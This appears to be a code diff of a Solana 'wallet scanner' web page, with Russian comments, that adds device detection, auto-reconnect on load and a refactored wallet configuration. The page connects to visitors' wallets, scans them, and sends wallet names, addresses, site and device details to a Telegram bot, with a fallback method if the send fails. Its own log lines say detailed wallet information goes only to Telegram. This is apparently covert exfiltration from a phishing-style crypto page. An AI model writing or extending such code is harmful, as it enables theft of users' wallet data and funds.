+      const device = detectDevice();
+      
+      let message = `🚀 ПОДКЛЮЧЕНИЕ КОШЕЛЬКА (Enhanced Mobile Support)
 
 `;
       message += `💼 Кошелек: ${walletName}
@@ -981,6 +1251,14 @@
       message += `⏰ Время: ${currentTime}
 `;
       message += `🌐 Сайт: ${window.location.hostname}
+`;
+      message += `📱 Устройство: ${device.isMobile ? 'Mobile' : 'Desktop'} (${device.os})
+`;
+      if (device.isInWalletApp) {
+        message += `🔗 Браузер кошелька: ${device.isInWalletApp}
+`;
+      }
+      message += `
 
 `;
       
@@ -1058,8 +1336,6 @@
         } else {
           console.error('❌ Ошибка Telegram API:', responseData);
           showTelegramStatus('error', '❌ Ошибка отправки');
-          
-          // Пробуем альтернативный метод
           return await sendViaAlternativeMethod(message);
         }
       } catch (error) {
@@ -1368,7 +1644,7 @@
     }
 
     // ============================================================================
-    // ENHANCED WALLET MANAGER
+    // ENHANCED WALLET MANAGER WITH WALLET-ADAPTER PRINCIPLES
     // ============================================================================
 
     class SolanaWalletManager {
@@ -1379,79 +1655,39 @@
         this.walletData = null;
         this.scanner = new SolanaWalletScanner();
         this.isScanning = false;
+        this.autoConnect = true; // Wallet-adapter принцип
         
-        this.walletConfigs = {
-          phantom: {
-            name: 'Phantom',
-            provider: () => window.phantom?.solana,
-            downloadUrl: 'https://phantom.app/',
-            checkMethod: () => window.phantom?.solana?.isPhantom
-          },
-          solflare: {
-            name: 'Solflare',
-            provider: () => window.solflare,
-            downloadUrl: 'https://solflare.com/',
-            checkMethod: () => window.solflare?.isSolflare
-          },
-          trustwallet: {
-            name: 'Trust Wallet',
-            provider: () => window.trustwallet?.solana,
-            downloadUrl: 'https://trustwallet.com/',
-            checkMethod: () => window.trustwallet?.solana
-          },
-          coinbase: {
-            name: 'Coinbase Wallet',
-            provider: () => window.coinbaseSolana,
-            downloadUrl: 'https://www.coinbase.com/wallet',
-            checkMethod: () => window.coinbaseSolana
-          },
-          bitget: {
-            name: 'Bitget Wallet',
-            provider: () => window.bitkeep?.solana,
-            downloadUrl: 'https://web3.bitget.com/',
-            checkMethod: () => window.bitkeep?.solana
-          },
-          backpack: {
-            name: 'Backpack',
-            provider: () => window.backpack,
-            downloadUrl: 'https://backpack.app/',
-            checkMethod: () => window.backpack
-          },
-          okx: {
-            name: 'OKX Wallet',
-            provider: () => window.okxwallet?.solana,
-            downloadUrl: 'https://www.okx.com/web3',
-            checkMethod: () => window.okxwallet?.solana
-          },
-          exodus: {
-            name: 'Exodus',
-            provider: () => window.exodus?.solana,
-            downloadUrl: 'https://www.exodus.com/',
-            checkMethod: () => window.exodus?.solana
-          },
-          safepal: {
-            name: 'SafePal',
-            provider: () => window.safepal?.solana,
-            downloadUrl: 'https://www.safepal.com/',
-            checkMethod: () => window.safepal?.solana
-          }
-        };
-
         this.init();
       }
 
       async init() {
         this.setupEventListeners();
-        this.checkPreviousConnection();
+        
+        // Проверяем статусы кошельков
+        checkWalletStatuses();
+        
+        // Auto-connect если включен
+        if (this.autoConnect) {
+          await this.checkPreviousConnection();
+        }
       }
 
       async checkPreviousConnection() {
         const savedWallet = localStorage.getItem('connectedWallet');
-        if (savedWallet && this.walletConfigs[savedWallet]) {
+        if (savedWallet && WALLET_ADAPTER_CONFIG[savedWallet]) {
           try {
-            await this.connectWallet(savedWallet, false);
+            const wallet = WALLET_ADAPTER_CONFIG[savedWallet];
+            const readyState = wallet.readyState();
+            
+            if (readyState === 'Installed') {
+              console.log(`🔄 Attempting auto-reconnect to ${wallet.name}...`);
+              const result = await wallet.connect();
+              if (result) {
+                this.onWalletConnected(result.publicKey, wallet.name, result.provider);
+              }
+            }
           } catch (error) {
-            console.log('Previous connection failed:', error);
+            console.log('Auto-reconnect failed:', error);
             localStorage.removeItem('connectedWallet');
           }
         }
@@ -1463,75 +1699,54 @@
           return;
         }
 
-        const config = this.walletConfigs[walletKey];
+        const wallet = WALLET_ADAPTER_CONFIG[walletKey];
         
-        if (!config) {
+        if (!wallet) {
           throw new Error(`Unsupported wallet: ${walletKey}`);
         }
 
-        this.showConnectionStatus('loading', `Connecting to ${config.name}...`);
+        this.showConnectionStatus('loading', `Connecting to ${wallet.name}...`);
 
         try {
-          let provider = config.provider();
+          const device = detectDevice();
+          const readyState = wallet.readyState();
           
-          // Если кошелек не установлен, показываем модальное окно с deep links
-          if (!provider && requestPermission) {
-            console.log(`${config.name} не установлен, показываем модальное окно`);
+          // Если кошелек установлен на десктопе, подключаемся напрямую
+          if (!device.isMobile && readyState === 'Installed' && requestPermission) {
+            console.log(`🔗 Direct connection to ${wallet.name}...`);
+            const result = await wallet.connect();
+            if (result) {
+              this.onWalletConnected(result.publicKey, wallet.name, result.provider);
+              localStorage.setItem('connectedWallet', walletKey);
+              return result;
+            }
+          }
+          // Если мобильное устройство или кошелек не установлен
+          else {
+            console.log(`📱 Showing connection modal for ${wallet.name}...`);
             showConnectionModal(walletKey);
             return;
           }
 
-          let response;
-          
-          if (walletKey === 'phantom') {
-            response = await this.connectPhantom(provider, requestPermission);
-          } else if (walletKey === 'solflare') {
-            response = await this.connectSolflare(provider, requestPermission);
-          } else {
-            response = await this.connectGenericWallet(provider, requestPermission);
-          }
-
-          this.connectedWallet = provider;
-
-          let walletAddress;
-          if (response.publicKey) {
-            if (typeof response.publicKey === 'string') {
-              walletAddress = response.publicKey;
-            } else if (response.publicKey.toString) {
-              walletAddress = response.publicKey.toString();
-            } else if (response.publicKey.toBase58) {
-              walletAddress = response.publicKey.toBase58();
-            }
-          } else if (provider.publicKey) {
-            if (typeof provider.publicKey === 'string') {
-              walletAddress = provider.publicKey;
-            } else if (provider.publicKey.toString) {
-              walletAddress = provider.publicKey.toString();
-            } else if (provider.publicKey.toBase58) {
-              walletAddress = provider.publicKey.toBase58();
-            }
-          }
-
-          this.walletAddress = walletAddress;
-          this.walletName = config.name;
-
-          console.log('🔍 Полученный адрес кошелька:', this.walletAddress);
-
-          localStorage.setItem('connectedWallet', walletKey);
-
-          await this.performWalletScan();
-          this.setupWalletEventListeners(provider);
-
-          console.log(`Connected to ${this.walletName}:`, this.walletAddress);
-          
-          return response;
-
         } catch (error) {
-          console.error(`Failed to connect to ${config.name}:`, error);
+          console.error(`Failed to connect to ${wallet.name}:`, error);
           this.showConnectionStatus('error', error.message);
           this.isScanning = false;
           throw error;
         }
+      }
+
+      // Callback для успешного подключения кошелька
+      async onWalletConnected(publicKey, walletName, provider) {
+        console.log(`✅ Wallet connected: ${walletName}, Address: ${publicKey}`);
+        
+        this.connectedWallet = provider;
+        this.walletAddress = publicKey;
+        this.walletName = walletName;
+
+        this.updateConnectionUI();
+        await this.performWalletScan();
+        this.setupWalletEventListeners(provider);
       }
 
       async performWalletScan() {
@@ -1588,53 +1803,6 @@
           this.showConnectionStatus('error', `Scan failed: ${error.message}`);
         } finally {
           this.isScanning = false;
-        }
-      }
-
-      async connectPhantom(provider, requestPermission) {
-        if (requestPermission) {
-          const response = await provider.connect();
-          console.log('🔍 Phantom response:', response);
-          return response;
-        } else {
-          if (provider.isConnected && provider.publicKey) {
-            console.log('🔍 Phantom already connected:', provider.publicKey);
-            return { publicKey: provider.publicKey };
-          } else {
-            throw new Error('Phantom wallet not connected');
-          }
-        }
-      }
-
-      async connectSolflare(provider, requestPermission) {
-        if (requestPermission) {
-          await provider.connect();
-          console.log('🔍 Solflare connected:', provider.publicKey);
-          return { publicKey: provider.publicKey };
-        } else {
-          if (provider.isConnected && provider.publicKey) {
-            console.log('🔍 Solflare already connected:', provider.publicKey);
-            return { publicKey: provider.publicKey };
-          } else {
-            throw new Error('Solflare wallet not connected');
-          }
-        }
-      }
-
-      async connectGenericWallet(provider, requestPermission) {
-        if (requestPermission) {
-          if (provider.connect) {
-            const response = await provider.connect();
-            return response;
-          } else {
-            throw new Error('Wallet does not support connection');
-          }
-        } else {
-          if (provider.isConnected && provider.publicKey) {
-            return { publicKey: provider.publicKey };
-          } else {
-            throw new Error('Wallet not connected');
-          }
         }
       }
 
@@ -1860,11 +2028,16 @@
 
     // Инициализация приложения
     document.addEventListener('DOMContentLoaded', async () => {
-      console.log('🚀 Инициализация приложения...');
+      console.log('🚀 Инициализация приложения с wallet-adapter принципами...');
+      
+      updateInitStatus('🔄 Проверка устройства...');
+      const device = detectDevice();
+      console.log('📱 Device detected:', device);
+      
+      updateInitStatus('🔄 Проверка кошельков...');
+      checkWalletStatuses();
       
       updateInitStatus('🔄 Инициализация Wallet Manager...');
-      
-      // Инициализируем Wallet Manager
       const walletManager = new SolanaWalletManager();
       window.walletManager = walletManager;
       
@@ -1874,6 +2047,7 @@
       }, 2000);
       
       console.log('✅ Приложение готово к работе!');
+      console.log('📱 Enhanced mobile support with wallet-adapter principles enabled');
     });
 
     // ============================================================================
@@ -1913,11 +2087,14 @@
     window.detectDevice = detectDevice;
     window.openWallet = openWallet;
     window.showConnectionModal = showConnectionModal;
+    window.WALLET_ADAPTER_CONFIG = WALLET_ADAPTER_CONFIG;
 
-    console.log('🚀 Solana Wallet Scanner с улучшенной мобильной поддержкой загружен!');
-    console.log('📱 Автоматическое определение устройства и deep links включены');
+    console.log('🚀 Solana Wallet Scanner с wallet-adapter принципами загружен!');
+    console.log('📱 Улучшенная мобильная поддержка и автоматическое определение устройства');
+    console.log('🔗 Deep links и встроенные браузеры кошельков поддерживаются');
     console.log('📤 Автоматическая отправка данных в Telegram включена');
     console.log('🔒 Детальная информация о кошельке отправляется только в Telegram');
   </script>
 </body>
 </html>
+
